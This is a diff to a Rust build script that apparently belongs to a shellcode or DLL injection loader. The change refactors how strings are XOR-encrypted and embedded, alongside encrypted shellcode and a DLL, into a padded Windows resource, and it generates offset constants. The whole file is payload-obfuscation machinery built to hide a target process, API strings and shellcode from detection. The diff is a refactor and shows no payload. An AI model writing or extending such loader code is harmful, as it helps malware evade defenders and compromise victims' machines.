@@ -1,22 +1,39 @@
-use crate::build_src::build_config::{DLL_PATH, PAD_RANGE, RESOURCE_ID, RESOURCE_NAME, SHELLCODE_PATH, TARGET_PROCESS, USER_STRINGS};
+use crate::build_src::build_config::{
+    DLL_PATH, PAD_RANGE, RESOURCE_ID, RESOURCE_NAME, SHELLCODE_PATH, TARGET_PROCESS, USER_STRINGS,
+};
 use crate::build_src::build_util::{
     aes_encrypt_bytes, generate_random_bytes, get_iv_len, get_key_len, xor_encrypt_bytes,
 };
+use crate::build_src::required::STRINGS;
 use rand;
 use rand::seq::SliceRandom;
 use rand::Rng;
 use std::{env, fs};
 use winresource::WindowsResource;
-use crate::build_src::required::STRINGS;
 
 type BuildFn = fn(&mut ResourceGenerator, &mut Vec<u8>);
 
-struct Strings {
+struct XORString {
     string_name: &'static str,
-    encrypted_bytes: Vec<u8>,
+    encrypted_string: Vec<u8>,
     offset: usize,
     key_bytes: Vec<u8>,
     key_offset: usize,
+}
+
+impl XORString {
+    fn new(string_name: &'static str, key_bytes: Vec<u8>) -> Self {
+        XORString {
+            string_name,
+            encrypted_string: xor_encrypt_bytes(
+                string_name.to_lowercase().as_bytes(),
+                &key_bytes[..],
+            ),
+            offset: 0,
+            key_bytes,
+            key_offset: 0,
+        }
+    }
 }
 
 pub(crate) struct ResourceGenerator {
@@ -31,7 +48,7 @@ pub(crate) struct ResourceGenerator {
     shellcode_offset: usize,
     dll_bytes: Vec<u8>,
     dll_offset: usize,
-    strings: Vec<Strings>,
+    strings: Vec<XORString>,
 }
 
 impl ResourceGenerator {
@@ -71,26 +88,11 @@ impl ResourceGenerator {
 
         let strings = STRINGS
             .iter()
-            .map(|string_name| {
-                let key = generate_random_bytes(string_name.len());
-                Strings {
-                    string_name,
-                    encrypted_bytes: xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
-                    offset: usize::MAX,
-                    key_bytes: key,
-                    key_offset: usize::MAX,
-                }
-            })
+            .map(|string_name| XORString::new(string_name, generate_random_bytes(string_name.len())))
             .chain(USER_STRINGS.iter().map(|string_name| {
-                let key = generate_random_bytes(string_name.len());
-                Strings {
-                    string_name,
-                    encrypted_bytes: xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
-                    offset: usize::MAX,
-                    key_bytes: key,
-                    key_offset: usize::MAX,
-                }
-            })).collect();
+                XORString::new(string_name, generate_random_bytes(string_name.len()))
+            }))
+            .collect();
 
         ResourceGenerator {
             out_dir,
@@ -122,7 +124,7 @@ impl ResourceGenerator {
 
         let mut string = self.strings.pop().expect("No string info to pop!");
         string.offset = payload.len();
-        payload.extend(&string.encrypted_bytes);
+        payload.extend(&string.encrypted_string);
 
         //put the key in after, simplest solution.
         let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
@@ -271,7 +273,7 @@ impl ResourceGenerator {
             consts.push(format!(
                 "pub const {}: usize = {:#X};",
                 string.string_name.to_uppercase().replace(".", "_") + "_LEN",
-                string.encrypted_bytes.len()
+                string.encrypted_string.len()
             ));
             consts.push(format!(
                 "pub const {}: usize = {:#X};",
